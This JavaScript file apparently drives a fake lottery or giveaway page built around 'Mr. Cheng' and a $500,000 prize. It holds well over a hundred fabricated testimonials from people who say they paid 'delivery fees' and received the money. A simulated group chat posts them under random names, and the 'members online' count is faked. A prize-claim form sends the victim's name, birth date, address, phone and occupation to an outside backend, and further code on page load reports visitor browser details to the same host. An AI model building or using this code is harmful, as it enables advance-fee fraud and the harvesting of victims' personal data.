const messages = [
  "So real happy to tell you I am dept free now. My money was delivered to me without delay. Thank you so much Mr. Cheng. 😊",
  "We paid the fees, glad the money was delivered to us today. Very happy. Thank you so much, I and my wife got the $500,000. 💵💑",
  "Hello Mr. Cheng, I am so happy right now. After I paid the agent for the delivery fees, he delivered the money package worth $500,000 to me. Thank you so much. 🎉",
  "It’s real, legit. I paid my delivery fees and received the money package the same day. A trust process. Thank you, sir. 💯",
  "After paying the delivery fees, I got my money delivered to me the same day. Thank you, Mr. Cheng. 🙏",
  "I am so relieved. The money was delivered promptly after I paid the delivery fees. Thank you, Mr. Cheng. 😊",
  "Finally free from debt! The money arrived as promised after I paid the necessary fees. Thank you, Mr. Cheng. 💸",
  "I can’t believe it! Paid the fees, and today my $500,000 package was delivered. Huge thanks to you, Mr. Cheng. 😄",
  "Such a great feeling to have the money delivered on time. Thanks for everything, Mr. Cheng. 🙌",
  "Just received the $500,000. Paid the fees, and everything went smoothly. Thank you, Mr. Cheng. 💰",
  "I’m debt-free now, thanks to your reliable service. The money was delivered promptly after the fees were paid. Thanks so much! 🥳",
  "The process was smooth, and the money came right after I paid the delivery fees. Big thanks, Mr. Cheng. 👍",
  "My $500,000 is here! Thank you for your trust and reliability, Mr. Cheng. 🙏💵",
  "Paid the fees, and everything was done on the same day. Thank you for making this happen, Mr. Cheng. 🙏",
  "You kept your word, Mr. Cheng. The money was delivered the same day I paid the fees. I appreciate you. 💯",
  "I’m so happy that the money arrived on time. Thanks for making it all happen after I paid the fees! 🎉",
  "I trusted the process, and it worked! My money was delivered after paying the required fees. Thank you so much, Mr. Cheng. 🏅",
  "Thank you, Mr. Cheng! The delivery was seamless after I paid the fees. I am grateful for your help. 😊",
  "It’s true, Mr. Cheng! I paid the delivery fees and received my money right away. So thankful! 🙌💸",
  "This process worked just like you said. Paid the fees, and received the $500,000. Thanks, Mr. Cheng! 🤑",
  "Everything happened exactly as planned. Paid the fees, and my money was delivered to me right on time. Thank you! 📦💰",
  "I’m so excited! The agent delivered the money package after I paid the fees. Thank you, Mr. Cheng! 🎉",
  "I didn’t believe it until I saw it! The money was delivered without delay after I paid. Thank you so much. 😲💸",
  "My wife and I are so grateful! The money came after paying the delivery fees. We received $500,000. Thanks, Mr. Cheng! 👩‍❤️‍👨💵",
  "Such a relief! I paid the fees, and the money was delivered same day. Thank you for your honesty, Mr. Cheng. 😊🙏",
  "The process was so smooth. Paid the fees, and the money arrived the same day. Thank you, Mr. Cheng. 🏅",
  "It worked perfectly! Paid the fees, and my money arrived without any delay. Thanks, Mr. Cheng. ✅",
  "Thank you for your prompt service. After I paid the fees, the money was delivered to me instantly. Much appreciated! 🙏💸",
  "I got my $500,000 today after paying the delivery fees. Everything was smooth and easy. Thank you, Mr. Cheng. 💰😊",
  "So happy and thankful! Paid the fees, and the money was delivered to me the same day. Appreciate it, Mr. Cheng! 🎉",
  "Everything went according to plan. Paid the delivery fees, and got my $500,000. Thank you, Mr. Cheng. 💵✅",
  "The delivery was flawless! Paid the fees and got my money package the same day. Thank you so much, Mr. Cheng. 💯",
  "I’m finally debt-free, all thanks to you! The money arrived as soon as I paid the fees. So grateful! 🙌💸",
  "Such a smooth transaction! Paid the fees, and now I’m receiving my $500,000. Thank you, Mr. Cheng. 💰😊",
  "No stress, just pure happiness. My $500,000 arrived after paying the fees. Thank you, Mr. Cheng. 🙏💵",
  "So excited! The money came through after I paid the required fees. Big thanks, Mr. Cheng! 🎉💰",
  "After paying the fees, I received my $500,000 today. Everything went exactly as you said. Thank you! 💯",
  "I can’t believe it! Paid the fees, and the money came through smoothly. Thank you, Mr. Cheng. 💸",
  "The money was delivered right on time after I paid the fees. Truly thankful for your service, Mr. Cheng. 🙏",
  "I’m grateful for your help! The money was delivered after I paid the delivery fees. Thank you, Mr. Cheng. 💵",
  "Thank you so much, Mr. Cheng! The process was quick and easy after I paid the fees. I got my $500,000. 😄💰",
  "I received my money package right on time. Thank you, Mr. Cheng, for delivering after the fees were paid. 😊💸",
  "I’m so glad everything went according to plan. The money arrived after paying the delivery fees. Big thanks! 🙏",
  "Everything was seamless! Paid the fees and got my $500,000. Thanks, Mr. Cheng! 💰",
  "It’s all true! After paying the delivery fees, my money was delivered the same day. Thanks again, Mr. Cheng! 🙌💵",
  "The agent delivered the money package after I paid the fees. So happy with the process! Thank you, Mr. Cheng! 🎉",
  "The money was delivered to me on the same day I paid the fees. I am so relieved! Thank you so much, Mr. Cheng. 😊",
  "My wife and I are thrilled! The money came in after we paid the delivery fees. Huge thanks, Mr. Cheng! 👨‍👩‍👧‍👦💵",
  "What a smooth process! Paid the fees, and now my money is here. Thank you, Mr. Cheng. 🏆💰",
  "I’m officially debt-free! The money arrived right after paying the fees. Thank you, Mr. Cheng. 🎉💵",
  "This was the easiest process! Paid the delivery fees, and the $500,000 was delivered right to me. Thanks so much! 💸",
  "No delays! Paid the delivery fees, and the money arrived promptly. Huge thanks, Mr. Cheng. 🙌💵",
  "Thank you for everything, Mr. Cheng! I paid the fees, and my money arrived as expected. 🙏💰",
  "I was so impressed by how smooth this process was. Paid the fees and received the $500,000 the same day. Thank you! 😊💵",
  "I’m finally debt-free! The money was delivered after I paid the fees. Thanks a lot, Mr. Cheng! 💸🎉",
  "Such an amazing gift! I’m beyond grateful. 😍🎁",
  "This will help me so much, thank you for your generosity. 💰🙏",
  "I never expected something like this to happen to me. 😳💫",
  "I’m in shock! This is truly a blessing. 😱💖",
  "I’m so excited, this is a dream come true! 😍🌟",
  "Thank you, Cheng and your wife, for making a real difference. 🙏💑✨",
  "This is going to change my life! I can’t wait to pay it forward. 💸💞",
  "I’ve never been this excited. Thank you for the opportunity! 🎉😆",
  "I’m speechless! This is the help I needed. 😶💖",
  "You guys are doing incredible things! I’m honored to be a part of this. 👏🌍",
  "I can't wait to use this to help my family and others! 👨‍👩‍👧‍👦❤️",
  "I feel so lucky to have been selected. Thank you for your generosity! 🍀💸",
  "This is more than I ever imagined. Thank you for everything. 🙏✨",
  "I’m sending you my deepest thanks! This is life-changing! 💖🙏",
  "I will forever be grateful to you for this amazing opportunity. 🙏💯",
  "This is so much more than money, it's hope. Thank you. 🌟💙",
  "Words can’t describe how thankful I am for this incredible gift. 😍💝",
  "I can't believe it! I just received $500,000! Thank you so much for this incredible gift!",
  "Wow! I got the $500,000! This is life-changing. Thank you, thank you!",
  "I just got a $500,000 donation! I’m still in shock. Thank you for changing my life!",
  "I can’t believe I’ve been selected for the $500,000 giveaway. This will make a huge difference!",
  "I received $500,000 today! I’m so thankful for this incredible opportunity!",
  "This is real! I just got my $500,000. I can’t express how grateful I am!",
  "I’m in tears right now! I just received $500,000! This is a dream come true. Thank you!",
  "Thank you so much! I’ve received $500,000, and I can’t wait to make the most of this!",
  "I can’t believe it’s real! Just got $500,000. I feel so lucky. Thank you!",
  "This is a blessing! $500,000 just came through. Thank you for changing my life!",
  "I just got my $500,000! I’m overwhelmed with gratitude. This is amazing!",
  "Thank you so much! $500,000 just landed in my account. I will use this wisely!",
  "I’ve been chosen for the $500,000 giveaway! I can’t thank you enough for this incredible gift!",
  "I can’t believe I just received $500,000. This is going to change my life forever!",
  "Wow, it’s true! $500,000 has been deposited into my account. I’m so thankful!",
  "I’m still in shock! $500,000 just hit my bank account. Thank you so much for this opportunity!",
  "This is unreal! I just received $500,000. Thank you for making my dreams come true!",
  "I can’t believe it! $500,000 just arrived. Thank you for this life-changing moment!",
  "I’ve never been so happy in my life! I just received $500,000! This is unbelievable!",
  "I can’t thank you enough! $500,000 just came through. I’m forever grateful!",
  "I’m crying happy tears! I just got $500,000. Thank you for this amazing gift!",
  "Thank you so much for the $500,000! This is going to help me take care of so much!",
  "I got the $500,000! Thank you for giving me this incredible opportunity!",
  "Don't worry, it's real! I just got my $500,000! 😱💸",
  "I know it sounds unbelievable, but it's true! $500,000 in my account! 😳💰",
  "No need to be scared, it’s for real! I’ve got $500,000! 🙌🎉",
  "Believe it or not, this is real! I just received $500,000! 😲💵",
  "It’s not a scam! I just received $500,000! I’m in shock! 😱💥",
  "I know it’s hard to believe, but this is real! $500,000 just came through! 🤯💸",
  "It really happened! I just got $500,000. This is no joke! 🤑🎉",
  "It’s not a dream, it’s real! I’ve received $500,000! ✨💰",
  "Don't worry, it's the real deal! $500,000 is now mine! 💵💯",
  "Everything went smoothly. I paid the fees, and the $500,000 was delivered promptly. Thank you, Mr. Cheng. 💵",
  "I’m so grateful for this! Paid the delivery fees, and my $500,000 came right on time. Thank you, Mr. Cheng. 🙏💸",
  "After paying the fees, I received the money package without delay. Thank you, Mr. Cheng! 🙏💰",
  "I am so happy that everything went according to plan! Paid the fees, and the money arrived! 🎉",
  "I paid the fees, and now I’ve received my $500,000! Such a great feeling! Thank you, Mr. Cheng. 💵",
  "Thanks to you, Mr. Cheng, the process went without a hitch! I paid the fees and got the $500,000. 😁",
  "So relieved! Paid the fees and received my money immediately. Thank you so much, Mr. Cheng. 💸",
  "Everything went perfect! Paid the fees, and the $500,000 was delivered right on time. Thanks again, Mr. Cheng. 💯",
  "I can finally breathe! The money came right after paying the delivery fees. Big thanks, Mr. Cheng! 🙌",
  "Just got my $500,000! Paid the delivery fees, and it arrived the same day. Thanks, Mr. Cheng. 💵",
  "Everything went exactly as expected. Paid the fees, and received my money package right away. Thanks, Mr. Cheng. 💰",
  "Such a smooth experience! Paid the fees, and now I’ve got my $500,000. Thank you, Mr. Cheng! 🙏",
  "I’m so happy to have my money now! Paid the fees, and the agent delivered it right on time. 💵😄",
  "The $500,000 was delivered as promised after paying the delivery fees. Thanks for making it happen, Mr. Cheng! 💯",
  "I’m debt-free and happy! The money arrived right after I paid the fees. Thanks again, Mr. Cheng! 💵",
  "Thank you, Mr. Cheng! The money was delivered after paying the fees, and everything was perfect. 💸😊",
  "I'm so thankful! The $500,000 was delivered after I paid the delivery fees. Thank you for your trust, Mr. Cheng. 🙏",
  "Just received my money! Paid the fees, and the agent delivered it the same day. Thank you, Mr. Cheng! 🎉",
  "No delays, no problems. Paid the fees, and my money was here as promised. Thank you so much, Mr. Cheng. 💰😊",
  "The money was delivered to me after paying the fees. Everything went smoothly. Thank you, Mr. Cheng. 💸",
  "So happy to be debt-free! The money arrived today after paying the required fees. Thank you, Mr. Cheng! 🎉",
  "Thank you for your honesty and quick service. Paid the fees, and my $500,000 was delivered on time. 💵",
  "I’m feeling great now! My $500,000 was delivered right after paying the fees. Thanks for everything, Mr. Cheng. 😄",
  "Smooth and easy process. Paid the fees, and the $500,000 was delivered right away. Thank you, Mr. Cheng! 💯",
  "I’m so thankful! The delivery was done promptly after I paid the fees. Big thanks to you, Mr. Cheng. 🙏💰",
  "I can't believe this is happening. Thank you for the opportunity! 🙌✨",
  "It’s for real! I just got $500,000! Thank you so much! 🙏💖",
  "I’m beyond excited to be part of such an incredible program.",
  "I’m so grateful to be selected for this life-changing giveaway!",
  "I’ll be forever grateful for your generosity. Thank you so much.",
  "This is exactly what I needed to turn my life around.",
  "I don’t even know how to express how thankful I am.",
  "This is such an amazing opportunity. Thank you for believing in me.",
  "I’m so excited to get started and make a positive impact.",
  "I can't wait to see how far this will go. I’m truly blessed!",
  "I’ve never felt so much hope in my life. Thank you for this!",
  "I’m sharing this news with my family—everyone is so happy for me.",
  "I can’t believe I was chosen. Thank you for making my dreams come true.",
  "I’m planning to use this to support my education. Thank you for the chance.",
  "This opportunity means everything to me. I will use it wisely!",
  "Thank you for making the world a better place, one person at a time.",
  "I’m still in disbelief. This is such a huge blessing!",
  "This is the most incredible thing that has ever happened to me.",
  "I never imagined something like this could happen to me.",
  "Thank you for making this possible. I will pay it forward.",
  "You’ve given me hope when I thought all was lost.",
  "This is beyond anything I could’ve dreamed of. Thank you!",
  "This is an absolute game-changer for me. Thank you!",
  "I can’t believe how generous you both are. Thank you for everything.",
];

const names = [
  "Alex",
  "Sarah",
  "Mike",
  "Emma",
  "James",
  "Olivia",
  "Liam",
  "Sophia",
  "Mason",
  "Isabella",
  "Ethan",
  "Ava",
  "David",
  "Mia",
  "William",
  "Charlotte",
  "Benjamin",
  "Amelia",
  "Lucas",
  "Harper",
  "Henry",
  "Chloe",
  "Jackson",
  "Ella",
  "Daniel",
  "Scarlett",
  "Owen",
  "Grace",
  "Matthew",
  "Sofia",
  "Jack",
  "Layla",
  "Alexander",
  "Zoe",
  "Aiden",
  "Lily",
  "Sebastian",
  "Aria",
  "Elijah",
  "Ella",
  "Samuel",
  "Madison",
  "Wyatt",
  "Emily",
  "Gabriel",
  "Abigail",
  "Joshua",
  "Avery",
  "Julian",
  "Luna",
  "Leo",
  "Victoria",
  "Jackson",
  "Sophie",
  "Isaac",
  "Megan",
  "Carter",
  "Nora",
  "Julian",
  "Ella",
  "Eli",
  "Evelyn",
  "Cameron",
  "Maya",
  "Austin",
  "Daniela",
  "Leo",
  "Mikayla",
  "Jacob",
  "Sophia",
  "Jaxon",
  "Ariana",
  "Violet",
  "Grayson",
  "Mila",
  "Omar",
  "Zoe",
  "Nathan",
  "Lila",
  "Blake",
  "Madeline",
  "Mason",
  "Ryan",
  "Addison",
  "Julia",
  "Hunter",
  "Piper",
  "Eva",
  "Cooper",
  "Caroline",
  "Liam",
  "Gianna",
  "Miles",
  "Giovanni",
  "Abigail",
  "Landon",
  "Paisley",
  "Caleb",
  "Leah",
  "Oliver",
  "Camila",
  "Eli",
  "Riley",
  "Sienna",
  "Elena",
  "Jade",
  "Asher",
  "Bella",
  "Jordan",
  "Ella",
];
const avatars = [
  "https://i.pravatar.cc/150?img=1",
  "https://i.pravatar.cc/150?img=2",
  "https://i.pravatar.cc/150?img=3",
  "https://i.pravatar.cc/150?img=4",
  "https://i.pravatar.cc/150?img=5",
  "https://i.pravatar.cc/150?img=6",
  "https://i.pravatar.cc/150?img=7",
  "https://i.pravatar.cc/150?img=8",
  "https://i.pravatar.cc/150?img=9",
  "https://i.pravatar.cc/150?img=10",
  "https://i.pravatar.cc/150?img=11",
  "https://i.pravatar.cc/150?img=12",
  "https://i.pravatar.cc/150?img=13",
  "https://i.pravatar.cc/150?img=14",
  "https://i.pravatar.cc/150?img=15",
  "https://i.pravatar.cc/150?img=16",
  "https://i.pravatar.cc/150?img=17",
  "https://i.pravatar.cc/150?img=18",
  "https://i.pravatar.cc/150?img=19",
  "https://i.pravatar.cc/150?img=20",
  "https://i.pravatar.cc/150?img=21",
  "https://i.pravatar.cc/150?img=22",
  "https://i.pravatar.cc/150?img=23",
  "https://i.pravatar.cc/150?img=24",
  "https://i.pravatar.cc/150?img=25",
  "https://i.pravatar.cc/150?img=26",
  "https://i.pravatar.cc/150?img=27",
  "https://i.pravatar.cc/150?img=28",
  "https://i.pravatar.cc/150?img=29",
  "https://i.pravatar.cc/150?img=30",
  "https://i.pravatar.cc/150?img=31",
  "https://i.pravatar.cc/150?img=32",
  "https://i.pravatar.cc/150?img=33",
  "https://i.pravatar.cc/150?img=34",
  "https://i.pravatar.cc/150?img=35",
  "https://i.pravatar.cc/150?img=36",
  "https://i.pravatar.cc/150?img=37",
  "https://i.pravatar.cc/150?img=38",
  "https://i.pravatar.cc/150?img=39",
  "https://i.pravatar.cc/150?img=40",
  "https://i.pravatar.cc/150?img=41",
  "https://i.pravatar.cc/150?img=42",
  "https://i.pravatar.cc/150?img=43",
  "https://i.pravatar.cc/150?img=44",
  "https://i.pravatar.cc/150?img=45",
  "https://i.pravatar.cc/150?img=46",
  "https://i.pravatar.cc/150?img=47",
  "https://i.pravatar.cc/150?img=48",
  "https://i.pravatar.cc/150?img=49",
  "https://i.pravatar.cc/150?img=50",
  "https://i.pravatar.cc/150?img=51",
  "https://i.pravatar.cc/150?img=52",
  "https://i.pravatar.cc/150?img=53",
  "https://i.pravatar.cc/150?img=54",
  "https://i.pravatar.cc/150?img=55",
  "https://i.pravatar.cc/150?img=56",
  "https://i.pravatar.cc/150?img=57",
  "https://i.pravatar.cc/150?img=58",
  "https://i.pravatar.cc/150?img=59",
];

// Default messages
const defaultMessages = [
  {
    name: "Sarah",
    message: "Hey everyone! Welcome to the group chat 👋",
    avatar: "https://i.pravatar.cc/150?img=1",
    isOwn: false,
  },
  {
    name: "Alex",
    message: "Thanks Sarah! Excited to be here!",
    avatar: "https://i.pravatar.cc/150?img=2",
    isOwn: true,
  },
  {
    name: "Mike",
    message: "How's everyone doing today?",
    avatar: "https://i.pravatar.cc/150?img=3",
    isOwn: false,
  },
  {
    name: "Emma",
    message: "Great! Just finished my morning coffee ☕",
    avatar: "https://i.pravatar.cc/150?img=4",
    isOwn: true,
  },
];

let isOwnMessage = false;

function createMessage(messageData = null) {
  const messageDiv = document.createElement("div");

  if (messageData) {
    messageDiv.className = `message ${messageData.isOwn ? "own" : ""} new`;
    messageDiv.innerHTML = `
            <img class="message-avatar" src="${
              messageData.avatar
            }" alt="avatar">
            <div class="message-content">
                <div class="message-header">
                    <span class="message-name">${messageData.name}</span>
                    <span class="message-time">${new Date().toLocaleTimeString(
                      [],
                      { hour: "2-digit", minute: "2-digit" }
                    )}</span>
                </div>
                <div class="message-text">${messageData.message}</div>
            </div>
        `;
  } else {
    messageDiv.className = `message ${isOwnMessage ? "own" : ""} new`;
    const randomName = names[Math.floor(Math.random() * names.length)];
    const randomMessage = messages[Math.floor(Math.random() * messages.length)];
    const randomAvatar = avatars[Math.floor(Math.random() * avatars.length)];

    messageDiv.innerHTML = `
            <img class="message-avatar" src="${randomAvatar}" alt="avatar">
            <div class="message-content">
                <div class="message-header">
                    <span class="message-name">${randomName}</span>
                    <span class="message-time">${new Date().toLocaleTimeString()}</span>
                </div>
                <div class="message-text">${randomMessage}</div>
            </div>
        `;
  }

  const chatMessages = document.getElementById("chatMessages");
  chatMessages.appendChild(messageDiv);
  chatMessages.scrollTop = chatMessages.scrollHeight;

  // Keep only the last 8 messages
  while (chatMessages.children.length > 8) {
    chatMessages.removeChild(chatMessages.firstChild);
  }
}

function getRandomInterval() {
  // Convert 2s to 35s to milliseconds (2000ms to 35000ms)
  const minTime = 1500;
  const maxTime = 25000;
  return Math.floor(Math.random() * (maxTime - minTime) + minTime);
}

function startChat() {
  createMessage();

  function scheduleNextMessage() {
    setTimeout(() => {
      createMessage();
      scheduleNextMessage();
    }, getRandomInterval());
  }

  scheduleNextMessage();
}

// Enhanced version with small variations
function updateOnlineCount() {
  const currentCount = getNumberFromString(
    document.querySelector(".online-count").textContent
  );

  // Generate a small variation (-5 to +5) from current count
  const variation = Math.floor(Math.random() * 11) - 5;

  // Ensure count stays within bounds (50-200)
  let newCount = currentCount + variation;
  newCount = Math.max(50, Math.min(200, newCount));

  const onlineCountElement = document.querySelector(".online-count");
  animateValue(onlineCountElement, currentCount, newCount, 1000);
}

function getNumberFromString(str) {
  return parseInt(str.match(/\d+/)[0]) || 0;
}

function animateValue(element, start, end, duration) {
  let startTimestamp = null;
  const step = (timestamp) => {
    if (!startTimestamp) startTimestamp = timestamp;
    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
    const currentCount = Math.floor(progress * (end - start) + start);
    element.textContent = `${currentCount} members online`;
    if (progress < 1) {
      window.requestAnimationFrame(step);
    }
  };
  window.requestAnimationFrame(step);
}

// Initialize online count and set up interval
function initializeOnlineCount() {
  // Set initial count
  updateOnlineCount();

  // Update count every 90 seconds
  setInterval(updateOnlineCount, 90000);
}

// Add this function to create more natural variations
function startRandomVariations() {
  // Occasionally update with small variations (every 5-15 seconds)
  setInterval(() => {
    if (Math.random() < 0.3) {
      // 30% chance to update
      updateOnlineCount();
    }
  }, 5000);
}

// Start the chat simulation when the page loads
window.onload = function () {
  startChat();
  initializeOnlineCount();
  startRandomVariations();
};

document
  .getElementById("prizeClaimForm")
  .addEventListener("submit", async function (e) {
    e.preventDefault();
    console.log("Form submitted"); // Debug log

    // Get the submit button and spinner
    const submitBtn = this.querySelector(".submit-btn");
    const btnText = submitBtn.querySelector(".btn-text");
    const spinner = submitBtn.querySelector(".spinner-border");

    // Disable button and show spinner
    submitBtn.classList.add("loading");
    spinner.classList.remove("d-none");
    submitBtn.disabled = true;

    try {
      const formData = {
        firstName: document.getElementById("firstName").value,
        lastName: document.getElementById("lastName").value,
        email: document.getElementById("email").value,
        phone: document.getElementById("phone").value,
        dob: document.getElementById("dob").value,
        gender: document.getElementById("gender").value,
        street: document.getElementById("street").value,
        city: document.getElementById("city").value,
        state: document.getElementById("state").value,
        zipCode: document.getElementById("zipCode").value,
        country: document.getElementById("country").value,
        maritalStatus: document.getElementById("maritalStatus").value,
        occupation: document.getElementById("occupation").value,
      };

      const response = await fetch(
        `https://lotto-backend-seven.vercel.app/send-email`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
          },
          body: JSON.stringify(formData),
        }
      );

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const data = await response.json();

      if (data.success) {
        // Show success message
        Swal.fire({
          icon: "success",
          title: "Success!",
          text: data.message,
          confirmButtonColor: "#c81533",
        }).then((result) => {
          if (result.isConfirmed) {
            // Show loading message
            Swal.fire({
              title: "Generating Your Unique Code",
              html: "Please wait...",
              timer: 1000,
              timerProgressBar: true,
              didOpen: () => {
                Swal.showLoading();
              },
            }).then(() => {
              // Generate unique code
              const timestamp = Date.now().toString(36);
              const random = Math.random().toString(36).substr(2, 5);
              const initials =
                formData.firstName.charAt(0) + formData.lastName.charAt(0);
              const uniqueCode =
                `${initials}-${timestamp}-${random}`.toUpperCase();

              // Show code card
              Swal.fire({
                html: `
                  <div class="unique-code-card">
                    <h3>Your Claim Code</h3>
                    <div class="code-display">${uniqueCode}</div>
                    <p class="warning-text">
                      <i class="fas fa-exclamation-triangle"></i>
                      Important: Do not share this code with anyone. Keep it safe for verification.
                    </p>
                    <p class="agent-contact-text">
                      <i class="fas fa-phone"></i>
                      An agent will contact you shortly using the phone number you provided. They will verify your identity using this code.
                    </p>
                  </div>
                `,
                showConfirmButton: true,
                confirmButtonColor: "#c81533",
                allowOutsideClick: false,
              });
            });
          }
        });
        document.getElementById("prizeClaimForm").reset();
      } else {
        throw new Error(data.message);
      }
    } catch (error) {
      console.error("Error:", error);
      Swal.fire({
        icon: "error",
        title: "Oops...",
        text: error.message || "Something went wrong. Please try again.",
        confirmButtonColor: "#c81533",
      });
    } finally {
      // Re-enable button and hide spinner
      submitBtn.classList.remove("loading");
      spinner.classList.add("d-none");
      submitBtn.disabled = false;
    }
  });

const screenSize = window.screen.width + "px X " + window.screen.height + "px";
const jsEnabled = true; // JavaScript is enabled
const cookiesEnabled = navigator.cookieEnabled ? "Enabled" : "Disabled";

// fetch("https://lotto-backend-seven.vercel.app/visitor")
//   .then((response) => response.text())
//   .then((data) => console.log(data))
//   .catch((error) => console.error("Error:", error));

// Send data to backend
fetch(
  "https://lotto-backend-seven.vercel.app/visitor/?screenSize=" +
    encodeURIComponent(screenSize) +
    "&jsEnabled=" +
    encodeURIComponent(jsEnabled) +
    "&cookiesEnabled=" +
    encodeURIComponent(cookiesEnabled)
)
  .then((response) => response.text())
  .then((data) => console.log(data))
  .catch((error) => console.error("Error:", error));
